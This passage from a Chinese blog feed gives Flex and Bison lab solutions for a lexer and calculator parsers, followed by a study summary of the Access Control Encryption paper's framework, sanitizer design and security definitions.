class="string">&quot;%s: ARRAYSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;PROGRAMSYM&#125;     &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: PROGRAMSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;MODSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: MODSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ANDSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ANDSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ORSYM&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ORSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;NOTSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: NOTSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;LBRACK&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: LBRACK\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;RBRACK&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: RBRACK\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;LPAREN&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: LPAREN\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;RPAREN&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: RPAREN\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;COMMA&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: COMMA\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;SEMICOLON&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: SEMICOLON\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;PERIOD&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: PERIOD\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;BECOME&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: BECOME\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;COLON&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: COLON\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;BEGINSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: BEGINSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ENDSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ENDSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;IFSYM&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: IFSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;THENSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: THENSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;ELSESYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ELSESYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;WHILESYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: WHILESYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;DOSYM&#125;			&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: DOSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;CALLSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: CALLSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;CONSTSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: CONSTSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;TYPESYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: TYPESYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;VARSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: VARSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;PROCSYM&#125;		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: PROCSYM\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;CHARCON&#125;        &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: CHARCON\n&quot;</span>,yytext);&#125;</span><br><span class="line">&#123;IDENT&#125;          &#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: IDENT\n&quot;</span>, yytext);&#125;</span><br><span class="line">&#123;ERROR&#125; 		&#123;<span class="built_in">printf</span>(<span class="string">&quot;%s: ERROR\n&quot;</span>,yytext);&#125;</span><br><span class="line">\n				&#123;&#125;</span><br><span class="line">.				&#123;&#125;</span><br><span class="line">%% <span class="comment">/*** end ***/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yywrap</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(yyin = <span class="built_in">fopen</span>(argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>))) &#123;</span><br><span class="line">			<span class="built_in">perror</span>(argv[<span class="number">1</span>]);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">yylex</span>());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第5关：Bison入门（逆波兰式计算）"><a href="#第5关：Bison入门（逆波兰式计算）" class="headerlink" title="第5关：Bison入门（逆波兰式计算）"></a>第5关：Bison入门（逆波兰式计算）</h3><p>就是语法的生成式的编写。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"> %&#123;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">yylex</span> <span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">yyerror</span> <span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *)</span></span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define api.value.type &#123;<span class="keyword">double</span>&#125;</span><br><span class="line">%token NUM</span><br><span class="line"></span><br><span class="line">%% </span><br><span class="line"><span class="comment">/* Grammar rules and actions follow.  */</span></span><br><span class="line">input:</span><br><span class="line">  %empty</span><br><span class="line">| input line</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line:</span><br><span class="line">  <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">| exp <span class="string">&#x27;\n&#x27;</span>      &#123; <span class="built_in">printf</span> (<span class="string">&quot;%.10g\n&quot;</span>, $<span class="number">1</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">exp:</span><br><span class="line">  NUM     &#123; $$ = $<span class="number">1</span>;&#125;</span><br><span class="line"> <span class="comment">/* begin */</span></span><br><span class="line"> | exp exp &#x27;+ &#x27; &#123;$$=$1+$2;&#125;</span><br><span class="line"> | exp exp <span class="string">&#x27;-&#x27;</span> &#123;$$=$<span class="number">1</span>-$<span class="number">2</span>;&#125;</span><br><span class="line"> | exp exp <span class="string">&#x27;*&#x27;</span>&#123;$$=$<span class="number">1</span>*$<span class="number">2</span>;&#125;</span><br><span class="line"> | exp exp <span class="string">&#x27;/&#x27;</span> &#123;$$=$<span class="number">1</span>/$<span class="number">2</span>;&#125;</span><br><span class="line"> | exp exp <span class="string">&#x27;^&#x27;</span>&#123;$$=<span class="built_in">pow</span>($<span class="number">1</span>,$<span class="number">2</span>);&#125;</span><br><span class="line"> | exp  <span class="string">&#x27;n&#x27;</span> &#123;$$=-$<span class="number">1</span>;&#125;</span><br><span class="line"> <span class="comment">/* end */</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The lexical analyzer returns a double floating point</span></span><br><span class="line"><span class="comment">   number on the stack and the token NUM, or the numeric code</span></span><br><span class="line"><span class="comment">   of the character read if not a number.  It skips all blanks</span></span><br><span class="line"><span class="comment">   and tabs, and returns 0 for end-of-input.  */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c;</span><br><span class="line">  <span class="comment">/* Skip white space.  */</span></span><br><span class="line">  <span class="keyword">while</span> ((c = <span class="built_in">getchar</span> ()) == <span class="string">&#x27; &#x27;</span> || c == <span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Process numbers.  */</span></span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;.&#x27;</span> || <span class="built_in">isdigit</span> (c))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">ungetc</span> (c, stdin);</span><br><span class="line">      <span class="built_in">scanf</span> (<span class="string">&quot;%lf&quot;</span>, &amp;yylval);</span><br><span class="line">      <span class="keyword">return</span> NUM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Return end-of-input.  */</span></span><br><span class="line">  <span class="keyword">if</span> (c == EOF)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">  	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* Return a single char.  */</span></span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">yyparse</span>();</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Called by yyparse on error.  */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span> <span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span> (stderr, <span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第6关：bison入门（中缀式计算）"><a href="#第6关：bison入门（中缀式计算）" class="headerlink" title="第6关：bison入门（中缀式计算）"></a>第6关：bison入门（中缀式计算）</h3><p>从入门到吃土。饶命.jpg。</p>
<p>（声明会影响算符的优先级？）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *)</span></span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%define api.value.type &#123;<span class="keyword">double</span>&#125;</span><br><span class="line"><span class="comment">/* Tokens */</span></span><br><span class="line">%token NUM</span><br><span class="line">%token EOL</span><br><span class="line">%token ADD SUB MUL DIV</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* begin */</span></span><br><span class="line">%left ADD  SUB</span><br><span class="line">%left MUL  DIV</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* end */</span></span><br><span class="line">%% </span><br><span class="line">  <span class="comment">/* Grammar rules and actions follow.  */</span></span><br><span class="line"> <span class="comment">/* begin */</span></span><br><span class="line">calclist:</span><br><span class="line">	%empty</span><br><span class="line">	|calclist exp EOL &#123;<span class="built_in">printf</span>(<span class="string">&quot;=%.10g\n&quot;</span>,$<span class="number">2</span>);&#125;</span><br><span class="line">exp:term</span><br><span class="line">	;</span><br><span class="line"></span><br><span class="line">term:NUM    &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">| term ADD   term &#123;$$=$<span class="number">1</span>+$<span class="number">3</span>;&#125;</span><br><span class="line">| term SUB  term &#123;$$=$<span class="number">1</span>-$<span class="number">3</span>;&#125;</span><br><span class="line">| term MUL term &#123;$$=$<span class="number">1</span>*$<span class="number">3</span>;&#125;</span><br><span class="line">| term DIV  term &#123;$$=$<span class="number">1</span>/$<span class="number">3</span>;&#125;</span><br><span class="line">	;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* end */</span></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The lexical analyzer returns a double floating point</span></span><br><span class="line"><span class="comment">   number on the stack and the token NUM, or the numeric code</span></span><br><span class="line"><span class="comment">   of the character read if not a number.  It skips all blanks</span></span><br><span class="line"><span class="comment">   and tabs, and returns 0 for end-of-input.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* begin */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> c;</span><br><span class="line">	<span class="keyword">while</span>((c=<span class="built_in">getchar</span>())==<span class="string">&#x27; &#x27;</span>||c==<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">if</span>(c==<span class="string">&#x27;.&#x27;</span>||<span class="built_in">isdigit</span>(c))</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="built_in">ungetc</span>(c,stdin);</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>,&amp;yylval)!=<span class="number">1</span>)</span><br><span class="line">		<span class="built_in">abort</span>();</span><br><span class="line">	<span class="keyword">return</span> NUM;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span>(c)&#123;</span><br><span class="line">	<span class="keyword">case</span> EOF: <span class="keyword">return</span> YYEOF;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:<span class="keyword">return</span> EOL;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> ADD;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> SUB;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> MUL;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: <span class="keyword">return</span> DIV;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> c;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* end */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">yyparse</span>();</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Called by yyparse on error.  */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span> <span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span> (stderr, <span class="string">&quot;%s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="第7关：Flex-Bison联合使用"><a href="#第7关：Flex-Bison联合使用" class="headerlink" title="第7关：Flex+Bison联合使用"></a>第7关：Flex+Bison联合使用</h3><p>注意取反的那个具有最高的优先级，拿出来单算。因为和SUB一个符号，真是让人头痛。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Filename:lab107.y</span></span><br><span class="line"><span class="comment">Author:</span></span><br><span class="line"><span class="comment">Date:</span></span><br><span class="line"><span class="comment">Makefile:</span></span><br><span class="line"><span class="comment">______________</span></span><br><span class="line"><span class="comment">scanner:lab107.l lab107.y</span></span><br><span class="line"><span class="comment">	bison -v -d lab107.y</span></span><br><span class="line"><span class="comment">	flex lab107.l</span></span><br><span class="line"><span class="comment">	gcc -o scanner 406.tab.c lex.yy.c -lm -lfl</span></span><br><span class="line"><span class="comment">.PHONY:clean</span></span><br><span class="line"><span class="comment">clean:</span></span><br><span class="line"><span class="comment">	rm scanner lab107.tab.c lex.yy.c lab107.tab.h</span></span><br><span class="line"><span class="comment">_______________</span></span><br><span class="line"><span class="comment">Description:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// Notice: &#x27;-&#x27; using as -5+2=-3 ;or 5-2, need something special. By LM. 2021 using </span></span><br><span class="line"><span class="comment">// with %precedence NEG used as the highest token, higher than &#x27;^&#x27;, then we can get -2^2=4; without %prec NEG in the rule, SUB is lower than ^, then -2^2=-4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> yylineno;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define api.value.type &#123;<span class="keyword">double</span>&#125;</span><br><span class="line">%token NUM</span><br><span class="line">%token EOL</span><br><span class="line">%token ADD </span><br><span class="line">%token SUB </span><br><span class="line">%token MUL </span><br><span class="line">%token DIV</span><br><span class="line">%token EXPO</span><br><span class="line">%token LP</span><br><span class="line">%token RP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">calclist:</span><br><span class="line">	%empty</span><br><span class="line">	|calclist exp EOL &#123;<span class="built_in">printf</span>(<span class="string">&quot;=%.10g\n&quot;</span>,$<span class="number">2</span>);&#125;</span><br><span class="line">	</span><br><span class="line">exp:term &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">   	| exp ADD exp &#123;$$=$<span class="number">1</span>+$<span class="number">3</span>;&#125;</span><br><span class="line">	| exp SUB exp &#123;$$=$<span class="number">1</span>-$<span class="number">3</span>;&#125;</span><br><span class="line">	| exp MUL exp &#123;$$=$<span class="number">1</span>*$<span class="number">3</span>;&#125;</span><br><span class="line">	| exp DIV exp &#123;$$=$<span class="number">1</span>/$<span class="number">3</span>;&#125;</span><br><span class="line">	| exp EXPO  exp &#123; $$ = <span class="built_in">pow</span> ($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">	| LP  exp  RP &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">	| error &#123;&#125;</span><br><span class="line">	;</span><br><span class="line"></span><br><span class="line">term:NUM   &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">| SUB NUM  &#123;$$=-$<span class="number">2</span>;&#125;</span><br><span class="line">	;</span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">	<span class="built_in">yyparse</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> <span class="keyword">const</span> *s)</span></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr,<span class="string">&quot;MyError:%s yylineno:%d\n&quot;</span>,s,yylineno);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>【1】<a href="https://blog.csdn.net/qq_35886593/article/details/90694664">BISON分析器详解！与flex完美CP</a></p>
<p>【2】<a href="https://blog.csdn.net/sirouni2003/article/details/400672?ops_request_misc=%7B%22request%5Fid%22%3A%22163543054116780264043602%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=163543054116780264043602&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-400672.pc_search_result_cache&amp;utm_term=Bison手册&amp;spm=1018.2226.3001.4187">GNU Bison 中文手册</a></p>
]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>编译原理</tag>
      </tags>
  </entry>
  <entry>
    <title>访问控制加密(ACE)</title>
    <url>/2021/07/30/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%8A%A0%E5%AF%86-ACE/</url>
    <content><![CDATA[<hr>
<div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>论文题目：$Access\;Control\;Encryption\;:Enforcing\;Information\;Flow\;With\;Cryptography$</p>
</div>
<hr>
<h1 id="ACE框架"><a href="#ACE框架" class="headerlink" title="ACE框架"></a>ACE框架</h1><h2 id="论文背景"><a href="#论文背景" class="headerlink" title="论文背景"></a>论文背景</h2><p>该篇文章介绍的访问控制加密是基于公钥广播加密的访问控制(下文中会有明显的介绍)。<br></p>
<p>传统的密码学对明文消息进行加密，加密后的明文如果是广播出去的话，任何人都能够拿到密文，显然是可以被攻击的。作者构想的访问控制加密首先想到只有拥有解密密钥的人才可以了解到明文，这一点与传统密码学类似。考虑到更加复杂的情况，在不相信任何人的情况下，使得广播出去的密文只有指定的接受者能够拿到正确的密文，而其他的接受者拿到的是错误的密文甚至是随机值。<br></p>
<p>这里会提到一个存在的模型：$Bell-Lapadula\;$模型，大致就是对一个用户系统进行分级，不同的用户对应不同的权限标识，如从底层的$Public\;$权限到顶层的$Top-secret\;$权限，底层权限的人对来自于高层权限的信息是无法接受的（或者读不懂），而高层权限无法向底层权限的人发送信息（不能写）。也就是信息流被控制只能从底层传向高层。</p>
<h2 id="实现前提"><a href="#实现前提" class="headerlink" title="实现前提"></a>实现前提</h2><p>首先便是该思想能够成功实现的假设：信息流是被控制的！所有的用户之间信息的传递都需要经过中间人的传递来实现（类似于网关的存在），否则的话信息可以随便发送便没有了该文章的意义，因此引入了装置$\;Sanitizer\;(简称San)\;$来控制信息流，现在只需要$San$​知道方案然后根据方案来判别发送者和接收者，将不合法的信息拦截即可。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210730152440.png" alt="初始框架"></p>
<p>问题出现：</p>
<blockquote>
<p>(1)用户发送信息时声明自己的身份，如何确保用户正确的声明了身份呢？</p>
<p>(2)San装置知道了太多的东西，对于用户组内部，修改密文或者对消息拦截与否不能保证（San作为中间人叛变？)</p>
<p>(3)San的功能无法外包出去。</p>
</blockquote>
<p>接下来如何简化$San$的功能使其知道尽可能少的信息？明确一点：</p>
<blockquote>
<p>$San$必须对发过来的消息进行处理，比如如果一个叛变的发送者不介意把消息告诉任何人，他丧心病狂的直接发送把明文发送出去，如果$San$不做任何处理，这样所有人都能够知道明文消息了！我们暂且将$San$对消息的处理称为随机化或者“消毒”吧。</p>
</blockquote>
<p>因此要求消毒处理不依赖于安全方案和发送接收方的身份，这样的话他就只需要知道消息的发送时间和消息长度即可，这样$San$​也能够外包出去。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210730154911.png" alt="简化后的San"></p>
<h2 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h2><p>一个$ACE\ $框架包括：</p>
<blockquote>
<p>(1)密钥生成算法：生成一系列的发送者密钥（类似于公钥）、接受者密钥（类似于私钥）和$Sanitizer\ Key\ $（用于消毒处理）。</p>
<p>(2)发送者$\;S\;$使用他的加密密钥对明文进行加密，发送给$San$后进行随机化处理，处理后的消息被广播出去（因为$San$不知道接收者是谁）。</p>
</blockquote>
<p>在上述前提下：两个不允许通信的人如果进行通信，由于接收者不知道解密密钥且消息经过了随机化处理，他是无法复现出明文的。</p>
<h2 id="安全性定义"><a href="#安全性定义" class="headerlink" title="安全性定义"></a>安全性定义</h2><p>首先声明：</p>
<blockquote>
<p>(1)$Senders\;and\;Receivers\;$：发送者$S_1,…,S_n\;$和接收者$R_1,…,R_n\;$，对于发送者$S_i\;$和接收者$R_j\;$之间，二者是否能够沟通信取决于矩阵$P:[n]\times[n]\rightarrow\{0,1\}$中的$P(i,j)$的值进行判断。$P(i,j)=0$便是二者不能够进行通信。</p>
<p>(2)$Network\;Model\;$：发送者发送的密文消息可以被所有接收者看见，只有一个公共的信道进行传输。一个发送者不能够单独将消息只发送给特殊的接收者。</p>
</blockquote>
<p>接下来安全性的定义如下：</p>
<blockquote>
<p>(1)$Correctness:$发送者发送出去的消息，所以要满足$P(i,j)=1\;$的接收者都能够复现出明文。</p>
<p>(2)$No-Read\;Rule:$满足$P(i,j)=0\;$​的所有用户都不能够得到关于明文的任何信息。</p>
<blockquote>
<p>(2b)中间者$San$不能知道发送的消息明文和发送者的身份以防止中间者叛变。</p>
</blockquote>
<p>(3)$No-Write\;Rule:$如果$P(i,j)=0\;$，那么任何发送者$S_i\;$都不应该与接收者$R_j\;$交流任何信息。</p>
</blockquote>
<p>考虑第三条规则，由$S_i\;$不能够写信息给$\;R_j\;$，如果由中间人$San$来判断的话，那么$San\;$知道的信息就需要包括矩阵$\;P\;$了，因此可以转化为由接收者$\;R_j\;$来验证两者之间能否通信的问题，如果不满足通信要求就忽略掉信息。</p>
<p>而且为了防止叛变的发送者直接将信息广播给所有人，所以中间的消毒过程需要对信息作出一些改变使得输出的结果仍类似于随机化的结果，但是在正确的接收者是可以复现出明文的。</p>
<p><strong><em>后续的实现中，将2与2b视为一条：即任何叛变的接收者的集合（即使与中间者San勾结）也不能够打破不能读的规则；而对于规则3，前提假设为中间者San是不会与叛变的发送者和叛变的接收者进行勾结（因为在二者能够通信的前提下，San无法阻止）。</em></strong></p>
<hr>
<h1 id="ACE定义"><a href="#ACE定义" class="headerlink" title="ACE定义"></a>ACE定义</h1><h2 id="包含的算法"><a href="#包含的算法" class="headerlink" title="包含的算法"></a>包含的算法</h2><p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210801170405.png" alt="ACE算法"></p>
<p>如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">输入</th>
<th style="text-align:center">输出</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">$Setup$</td>
<td style="text-align:center">安全参数$\;k\;$、方案矩阵$\;P\;$</td>
<td style="text-align:center">主密钥$\;msk\;$、公开参数$\;pp\;$（包含明文空间$\;M\;$和密文空间$\;C,C^{‘}\;$）</td>
</tr>
<tr>
<td style="text-align:center">$Key\;Generation$</td>
<td style="text-align:center">主密钥$\;msk\;$，身份$\;i\;$，类型$\;t\;\in\;\{sen、rec、san\}$</td>
<td style="text-align:center">密钥$\;k\;$（加密密钥$\;ek_i\;$，解密密钥$\;dk_j\;$，消毒密钥$\;rk\;$且$ek_0\;=\;dk_0\;=\;pp\;$</td>
</tr>
<tr>
<td style="text-align:center">$Encrypt$</td>
<td style="text-align:center">加密密钥$\;ek_i\;$，明文$\;m\;$</td>
<td style="text-align:center">密文$\;c\;$</td>
</tr>
<tr>
<td style="text-align:center">$Sanitizer$</td>
<td style="text-align:center">密文$\;c\;$，消毒密钥$\;rk\;$</td>
<td style="text-align:center">消毒版本密文$\;c^{‘}\;$</td>
</tr>
<tr>
<td style="text-align:center">$Decryption$</td>
<td style="text-align:center">消毒版本密文$\;c^{‘}\;$，解密密钥$\;dk_j\;$</td>
<td style="text-align:center">明文$\;m^{‘}\;$</td>
</tr>
</tbody>
</table>
</div>
<h2 id="ACE要求"><a href="#ACE要求" class="headerlink" title="ACE要求"></a>ACE要求</h2><p>…</p>
<p><br></p>


	<div class="row">
    <embed src="../../../../../file/ACE.pdf" width="100%" height="550" type="application/pdf">
	</div>



